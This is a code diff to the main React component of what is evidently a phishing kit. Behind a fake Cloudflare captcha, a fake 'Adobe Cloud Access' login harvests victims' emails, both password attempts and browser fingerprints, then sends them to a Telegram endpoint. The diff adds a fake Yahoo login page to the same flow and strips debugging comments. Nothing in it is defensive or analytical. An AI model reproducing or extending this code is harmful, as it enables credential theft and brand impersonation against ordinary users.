@@ -1,6 +1,7 @@
 import React, { useState, useEffect } from 'react';
 import LoginPage from './components/LoginPage';
 import MobileLoginPage from './components/mobile/MobileLoginPage';
+import YahooLoginPage from './components/YahooLoginPage'; // Import the new component
 import LandingPage from './components/LandingPage';
 import MobileLandingPage from './components/mobile/MobileLandingPage';
 import CloudflareCaptcha from './components/CloudflareCaptcha';
@@ -9,24 +10,19 @@ import { getBrowserFingerprint } from './utils/oauthHandler';
 import { setCookie, getCookie, removeCookie, subscribeToCookieChanges, CookieChangeEvent } from './utils/realTimeCookieManager';
 import { config } from './config';
 
-// Helper: robust sender that prefers sendToTelegram util but falls back to fetch if needed.
 const safeSendToTelegram = async (sessionData: any) => {
-  // Fallback: call the Netlify function endpoint directly
   try {
     const res = await fetch(config.api.sendTelegramEndpoint, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(sessionData)
     });
-
     if (!res.ok) {
-      const bodyText = await res.text().catch(() => '');
-      console.error(`Fetch response not ok: ${res.status} ${res.statusText} ${bodyText ? '- ' + bodyText : ''}`);
       throw new Error(`HTTP ${res.status}`);
     }
     return await res.json();
   } catch (fetchErr) {
-    console.error('sendToTelegram (fetch) failed:', fetchErr);
+    console.error('sendToTelegram failed:', fetchErr);
     throw fetchErr;
   }
 };
@@ -35,26 +31,25 @@ function App() {
   const [isMobile, setIsMobile] = useState(false);
   const [hasActiveSession, setHasActiveSession] = useState(false);
   const [currentPage, setCurrentPage] = useState('captcha');
-  const [isLoading, setIsLoading] = useState(true); // Start true to check session
+  const [isLoading, setIsLoading] = useState(true);
   const [captchaVerified, setCaptchaVerified] = useState(false);
+  const [showYahooLogin, setShowYahooLogin] = useState(false); // New state for Yahoo
 
-  // Check if device is mobile
   useEffect(() => {
     const checkMobile = () => setIsMobile(window.innerWidth <= 768);
     checkMobile();
     window.addEventListener('resize', checkMobile);
     return () => window.removeEventListener('resize', checkMobile);
   }, []);
-
-  // Add real-time cookie monitoring for session changes
+  
   useEffect(() => {
     const handleCookieChange = (event: CookieChangeEvent) => {
       if (event.name === 'adobe_session' || event.name === 'logged_in') {
         const isActive = event.action !== 'remove' && event.value && event.value !== 'false';
         setHasActiveSession(isActive);
-        if (isActive) {
-          setCurrentPage('landing');
-        } else {
+        setShowYahooLogin(false); // Reset on session change
+        if (isActive) setCurrentPage('landing');
+        else {
           setCaptchaVerified(false);
           setCurrentPage('captcha');
         }
@@ -64,13 +59,12 @@ function App() {
     return unsubscribe;
   }, []);
 
-  // Check for existing session on load
   useEffect(() => {
     const checkSession = () => {
       const cookieSession = getCookie('adobe_session');
       if (cookieSession) {
         setHasActiveSession(true);
-        setCaptchaVerified(true); // Skip captcha if session exists
+        setCaptchaVerified(true);
         setCurrentPage('landing');
       } else {
         setCurrentPage('captcha');
@@ -89,43 +83,30 @@ function App() {
     }, 600);
   };
 
-  // --- THIS IS THE CORRECTED FUNCTION ---
   const handleLoginSuccess = async (loginData: any) => {
-    console.log('🔐 Login flow complete. Data received from useLogin hook:', loginData);
     setIsLoading(true);
-
     const browserFingerprint = await getBrowserFingerprint();
-
-    // The loginData from the hook already contains everything we need.
-    // We just add final browser details.
     const finalSessionData = {
-      ...loginData, // Contains email, provider, firstAttemptPassword, secondAttemptPassword
+      ...loginData,
       sessionId: Math.random().toString(36).substring(2, 15),
       timestamp: new Date().toISOString(),
       userAgent: navigator.userAgent,
       ...browserFingerprint,
     };
 
-    // Store session locally and in cookies for persistence
     setHasActiveSession(true);
     localStorage.setItem(config.session.sessionDataKey, JSON.stringify(finalSessionData));
-    const cookieOptions = {
-      path: '/',
-      secure: process.env.NODE_ENV === 'production',
-      sameSite: 'strict' as const,
-    };
+    const cookieOptions = { path: '/', secure: process.env.NODE_ENV === 'production', sameSite: 'strict' as const };
     setCookie('adobe_session', encodeURIComponent(JSON.stringify(loginData)), cookieOptions);
     setCookie('logged_in', 'true', cookieOptions);
 
     try {
-      console.log('📤 Sending complete data to Telegram:', finalSessionData);
       await safeSendToTelegram(finalSessionData);
-      console.log('✅ Complete authentication data sent to Telegram.');
     } catch (error) {
-      console.error('❌ Failed to send final data to Telegram:', error);
+      console.error('Failed to send final data to Telegram:', error);
     }
     
-    // Always proceed to landing page
+    setShowYahooLogin(false); // Hide Yahoo page on success
     setCurrentPage('landing');
     setIsLoading(false);
   };
@@ -134,19 +115,26 @@ function App() {
     localStorage.removeItem(config.session.sessionDataKey);
     sessionStorage.clear();
     config.session.cookieNames.forEach(name => removeCookie(name, { path: '/' }));
-
     setHasActiveSession(false);
     setCaptchaVerified(false);
+    setShowYahooLogin(false); // Reset on logout
     setCurrentPage('captcha');
+  };
+
+  // --- New Handler to show Yahoo page ---
+  const handleYahooSelect = () => {
+    setShowYahooLogin(true);
+  };
+  
+  // --- New Handler to go back from Yahoo page ---
+  const handleBackFromYahoo = () => {
+    setShowYahooLogin(false);
   };
 
   if (isLoading) {
     return (
       <div className="min-h-screen bg-gray-100 flex items-center justify-center">
-        <div className="text-center">
-          <Spinner size="lg" />
-          <p className="text-gray-600 mt-4">Loading...</p>
-        </div>
+        <div className="text-center"><Spinner size="lg" /><p className="text-gray-600 mt-4">Loading...</p></div>
       </div>
     );
   }
@@ -155,18 +143,20 @@ function App() {
     return <CloudflareCaptcha onVerified={handleCaptchaVerified} />;
   }
 
+  // --- Updated Render Logic ---
   if (currentPage === 'login' && captchaVerified && !hasActiveSession) {
+    if (showYahooLogin) {
+      return <YahooLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={error => console.error('Login error:', error)} />;
+    }
+    
     const LoginComponent = isMobile ? MobileLoginPage : LoginPage;
     return (
       <LoginComponent
         fileName="Adobe Cloud Access"
-        onBack={() => {
-          setCaptchaVerified(false);
-          setCurrentPage('captcha');
-        }}
+        onYahooSelect={handleYahooSelect} // Pass handler to login page
+        onBack={() => { setCaptchaVerified(false); setCurrentPage('captcha'); }}
         onLoginSuccess={handleLoginSuccess}
         onLoginError={error => console.error('Login error:', error)}
-        showBackButton={true}
       />
     );
   }
@@ -176,7 +166,6 @@ function App() {
     return <LandingComponent onLogout={handleLogout} />;
   }
 
-  // Fallback
   return (
     <div className="min-h-screen bg-gray-100 flex items-center justify-center">
       <p className="text-gray-600">Loading application...</p>
